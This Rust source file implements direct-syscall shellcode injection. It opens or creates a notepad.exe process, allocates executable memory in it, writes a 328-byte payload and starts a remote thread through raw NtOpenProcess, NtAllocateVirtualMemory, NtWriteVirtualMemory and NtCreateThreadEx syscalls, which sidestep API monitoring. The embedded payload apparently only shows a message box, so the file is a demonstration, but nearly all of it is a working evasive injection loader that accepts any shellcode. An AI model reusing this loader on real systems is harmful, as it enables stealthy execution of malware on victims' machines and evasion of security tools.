use std::ffi::{c_void, CString};
use std::mem::zeroed;
// use winapi::um::errhandlingapi::GetLastError;

mod utils;
use utils::get_pid_by_name;

use std::ptr::{null_mut, };
use rust_syscalls::syscall;
use winapi::shared::ntdef::{LPSTR, NTSTATUS, NULL, OBJECT_ATTRIBUTES};
use winapi::shared::ntstatus::STATUS_SUCCESS;
use winapi::um::handleapi::CloseHandle;
// use winapi::um::processthreadsapi::{OpenProcess, GetExitCodeProcess};
use winapi::um::winnt::{HANDLE, PROCESS_ALL_ACCESS};

use ntapi::ntapi_base::CLIENT_ID;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::processthreadsapi::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA};
use winapi::um::winbase::{STARTUPINFOEXA};


#[derive(Debug)]
enum ExecutionMode {
    Local,
    Remote(String),
}


fn direct_syscall_injector(payload: &[u8], execution_mode: ExecutionMode) -> Result<(), String> {
    if payload.is_empty() {
        return Err("Payload is empty".to_string());
    }

    let h_process = unsafe {
        match execution_mode {
            // Local : 使用当前进程
            ExecutionMode::Local => -1isize as HANDLE, // Current process

            // Remote使用远程线程执行的进程
            ExecutionMode::Remote(ref process_name) => {
                let target_pid = get_pid_by_name(process_name);
                
                // 修改了使用syscall来进行获取目标进程的句柄
                let mut client_id: CLIENT_ID = zeroed();
                client_id.UniqueProcess = target_pid as _;
                client_id.UniqueThread = 0 as _;

                let mut oa: OBJECT_ATTRIBUTES = OBJECT_ATTRIBUTES {
                    Length: size_of::<OBJECT_ATTRIBUTES>() as _,
                    RootDirectory: NULL,
                    ObjectName: NULL as _,
                    Attributes: 0,
                    SecurityDescriptor: NULL,
                    SecurityQualityOfService: NULL,
                };

                let mut h_process = null_mut();

                let status = syscall!(
                    "NtOpenProcess",
                    &mut h_process as *mut _,
                    PROCESS_ALL_ACCESS,
                    &mut oa,
                    &client_id as *const _
                );

                if status != 0 {
                    return Err(format!("Failed to open process: 0x{:X}", status));
                }


                h_process
            }
        }
    };

    unsafe {
        let mut remote_buffer: *mut c_void = null_mut();
        let mut alloc_size = payload.len();

        // 向目标进程申请内存，内存大小是payload的数据大小
        let nt_allocate_status: NTSTATUS = syscall!(
            "NtAllocateVirtualMemory",
            h_process,
            &mut remote_buffer as *mut _ as *mut _,
            0,
            &mut alloc_size as *mut usize,
            winapi::um::winnt::MEM_RESERVE | winapi::um::winnt::MEM_COMMIT, // MEM_RESERVE | MEM_COMMIT
            winapi::um::winnt::PAGE_EXECUTE_READWRITE // PAGE_EXECUTE_READWRITE
        );

        if nt_allocate_status != STATUS_SUCCESS {
            if h_process != (-1isize as HANDLE) {
                CloseHandle(h_process);
            }
            return Err(format!("NtAllocateVirtualMemory failed: {:#X}", nt_allocate_status));
        }

        println!("Allocated memory at {:p}, status: {:#X}", remote_buffer, nt_allocate_status);

        // 向目标进程申请的内存空间写入payload的值
        let mut bytes_written = 0;
        let nt_write_status: NTSTATUS = syscall!(
            "NtWriteVirtualMemory",
            h_process,
            remote_buffer,
            payload.as_ptr() as *mut c_void,
            payload.len(),
            &mut bytes_written
        );

        if nt_write_status != STATUS_SUCCESS {
            if h_process != (-1isize as HANDLE) {
                CloseHandle(h_process);
            }
            return Err(format!("NtWriteVirtualMemory failed: {:#X}", nt_write_status));
        }

        if bytes_written != payload.len() {
            if h_process != (-1isize as HANDLE) {
                CloseHandle(h_process);
            }
            return Err(format!(
                "Incomplete write: {} bytes written, expected {}",
                bytes_written,
                payload.len()
            ));
        }

        println!("Wrote {} bytes, status: {:#X}", bytes_written, nt_write_status);

        let mut h_thread: HANDLE = null_mut();

        // 向目标进程申请远程线程执行写入的payload
        let nt_create_status: NTSTATUS = syscall!(
            "NtCreateThreadEx",
            &mut h_thread,
            winapi::um::winnt::THREAD_ALL_ACCESS,
            NULL,
            h_process,
            std::mem::transmute::<*mut c_void, unsafe extern "system" fn() -> ()>(remote_buffer),
            NULL,
            0,
            0,
            0,
            0,
            NULL
        );

        if nt_create_status != STATUS_SUCCESS {
            if h_process != (-1isize as HANDLE) {
                CloseHandle(h_process);
            }
            return Err(format!("NtCreateThreadEx failed: {:#X}", nt_create_status));
        }

        println!("Created thread: {:#X}", nt_create_status);

        if h_process != (-1isize as HANDLE) {
            CloseHandle(h_process);
        }
        if !h_thread.is_null() {
            CloseHandle(h_thread);
        }

        Ok(())
    }
}

fn main() {
    
    // 弹出MessageBox
    // Title : DemonsEllen
    // Content : NewBee DemonsEllen
    let payload: [u8; 328] = [
        0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,
        0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
        0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,
        0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,
        0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
        0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
        0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,0x20,
        0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,0x00,
        0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,
        0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
        0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
        0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
        0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,0x08,
        0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,
        0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,
        0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,
        0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,
        0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,
        0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x3e,
        0x48,0x8d,0x8d,0x30,0x01,0x00,0x00,0x41,0xba,0x4c,0x77,0x26,
        0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,
        0x8d,0x95,0x0e,0x01,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x24,0x01,
        0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
        0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,
        // Content (22 bytes including padding for alignment)
        0x4e,0x65,0x77,0x42,0x65,0x65,0x20,0x44,0x65,0x6d,0x6f,0x6e,0x73,0x45,0x6c,0x6c,0x65,0x6e,0x00,0x00,0x00,0x00,
        // Title (11 bytes + null terminator = 12 bytes)
        0x44,0x65,0x6d,0x6f,0x6e,0x73,0x45,0x6c,0x6c,0x65,0x6e,0x00,
        // DLL (user32.dll)
        0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00
    ];


    let mut execution_mode = ExecutionMode::Local;

    unsafe {
        if get_pid_by_name("notepad.exe") != 0 {
            execution_mode = ExecutionMode::Remote("notepad.exe".to_string());
        } else {
            
            println!("Not find Notepad.exe, we create it now!!!");
            
            // 创建notepad进程
            let path = format!("{}\\System32\\notepad.exe", std::env::var("WINDIR").unwrap());
            let cmd = CString::new(path).expect("bad path");

            let mut startup_info: STARTUPINFOEXA = zeroed();
            let mut process_info: PROCESS_INFORMATION = zeroed();
            startup_info.StartupInfo.cb = size_of::<STARTUPINFOEXA>() as u32;
            
            startup_info.lpAttributeList = zeroed();
            let res = CreateProcessA(
                null_mut(),
                cmd.as_ptr() as LPSTR,
                null_mut(),
                null_mut(),
                0,
                0,
                null_mut(),
                null_mut(),
                &startup_info.StartupInfo as *const STARTUPINFOA as *mut STARTUPINFOA,
                &mut process_info,
            );
            if res == 0 {
                println!("failed to create notepad 0x{:#X}", GetLastError());
            }else {
                execution_mode = ExecutionMode::Remote("notepad.exe".to_string());
            }
        }
    }

    match direct_syscall_injector(&payload, execution_mode) {
        Ok(_) => println!("Injection Successful"),
        Err(e) => eprintln!("Injection failed: {}", e),
    }
    
    loop {
        std::thread::sleep(std::time::Duration::from_secs(60));
    }
}
